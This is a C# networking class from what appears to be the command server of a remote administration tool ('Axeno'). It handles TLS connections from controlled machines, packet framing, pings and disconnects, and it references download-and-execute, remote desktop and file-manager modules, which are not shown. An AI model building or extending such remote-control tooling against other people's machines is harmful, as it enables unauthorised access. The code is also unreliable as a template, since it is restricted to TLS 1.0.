using Axeno.Helper;
using Axeno.Networking.Communication;
using Axeno.Views.Pages.ClientManager;
using Axeno.Views.Windows;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using System.Windows.Threading;
using static Axeno.Helper.MainWindowSlides;
namespace Axeno.Networking.Connection
{
    public class Client
    {
        public Proc_mgr Proc_mgr { get; set; }
        public FileManager fManager { get; set; }

        public network_connections netCon { get; set; }
        public Dl_Execute sendFile { get; set; }
        public RemoteDesktop Rdp { get; set; }
        public SysInfo SysInfo { get; set; }   
        public ClientManager Manager { get; set; }
        public Socket Socket { get; set; }
        public string Ping { get; set; }
        public SslStream SslClient { get; set; }
        public string IP { get; set; }
        private byte[] ClientBuffer { get; set; }
        public ClientsLV CurrentClient { get; set; }
        private long HeaderSize { get; set; }
        private long Offset { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private System.Timers.Timer pingTimer = new System.Timers.Timer();
        public Client(Socket socket)
        {

            Socket = socket;
            
            IP = Socket.RemoteEndPoint.ToString().Split(':')[0];
            SslClient = new SslStream(new NetworkStream(Socket, true), false);
            SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);

            pingTimer.Elapsed += new ElapsedEventHandler(GetPingCheckConnection);
            pingTimer.Interval = 5000;
            pingTimer.Enabled = true;

        }
        public void GetPingCheckConnection(object source, ElapsedEventArgs e)
        {
            try
            {
                if (!CheckConnection())
                {
                    Disconnected();
                    return;
                }
                long pingTime = 0;
                Ping pingSender = new Ping();
                IPAddress address = IPAddress.Parse(Socket.RemoteEndPoint.ToString().Split(':')[0]);
                PingReply reply = pingSender.Send(address);

                if (reply.Status == IPStatus.Success)
                {
                    pingTime = reply.RoundtripTime;
                }
                ThreadPool.QueueUserWorkItem(delegate
                {
                    try
                    {
                        MainWindowSlides.ClientPanel.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            CurrentClient.ping = pingTime.ToString() + "ms";
                        }));
                    }
                    catch (Exception ex)
                    {
                        Disconnected();
                    }
                });
            }
            catch(Exception)
            {
                Disconnected();
            }

        }
        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                SslClient.EndAuthenticateAsServer(ar);
                Offset = 0;
                HeaderSize = 4;
                ClientBuffer = new byte[HeaderSize];
                SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
                
            }
            catch
            {
                SslClient?.Dispose();
                Socket?.Dispose();
            }
        }
        public void Disconnected()
        {
            pingTimer.Stop();
            
            try
            {
                ThreadPool.QueueUserWorkItem(delegate
                {

                    MainWindowSlides.ClientPanel.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                        lvClients.Items.Remove(CurrentClient);
                    }));
                    if (Manager != null)
                    {
                        Manager.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                        {
                            Manager.Close();

                        }));
                    }
                });

                Socket?.Dispose();
                pingTimer?.Dispose();
                SslClient?.Dispose();
            }
            catch { }

        }
        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!Socket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int recevied = SslClient.EndRead(ar);
                    if (recevied > 0)
                    {
                        HeaderSize -= recevied;
                        Offset += recevied;
                        switch (ClientBufferRecevied)
                        {
                            case false:
                                {
                                    if (HeaderSize == 0)
                                    {
                                        HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
                                        if (HeaderSize > 0)
                                        {
                                            ClientBuffer = new byte[HeaderSize];
                                            Offset = 0;
                                            ClientBufferRecevied = true;
                                        }
                                    }
                                    else if (HeaderSize < 0)
                                    {
                                        Disconnected();
                                        return;
                                    }
                                    break;
                                }

                            case true:
                                {
                                    if (HeaderSize == 0)
                                    {
                                        ThreadPool.QueueUserWorkItem(new Packet
                                        {
                                            client = this,
                                            data = ClientBuffer,
                                        }.Read, null);
                                        Offset = 0;
                                        HeaderSize = 4;
                                        ClientBuffer = new byte[HeaderSize];
                                        ClientBufferRecevied = false;
                                    }
                                    else if (HeaderSize < 0)
                                    {
                                        Disconnected();
                                        return;
                                    }
                                    break;
                                }
                        }
                        SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }
        public bool CheckConnection()
        {
            try
            {
                return !(Socket.Poll(1, SelectMode.SelectRead) && Socket.Available == 0); 
            }
            catch (SocketException) { return false; }

        }
        public void Send(byte[] msg)
        {
            try
            {
                if (!Socket.Connected)
                {
                    Disconnected();
                    return;
                }

                byte[] buffersize = BitConverter.GetBytes(msg.Length);
                Socket.Poll(-1, SelectMode.SelectWrite);
                SslClient.Write(buffersize, 0, buffersize.Length);

                if (msg.Length > 1000000)
                {
                    using (MemoryStream memoryStream = new MemoryStream(msg))
                    {
                        int read = 0;
                        memoryStream.Position = 0;
                        byte[] chunk = new byte[50 * 1000];
                        while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                        {
                            Socket.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(chunk, 0, read);
                            SslClient.Flush();
                        }
                    }
                }
                else
                {
                    Socket.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(msg, 0, msg.Length);
                    SslClient.Flush();
                }
            }
            catch
            {
                Disconnected();
            }
        }


    }
}
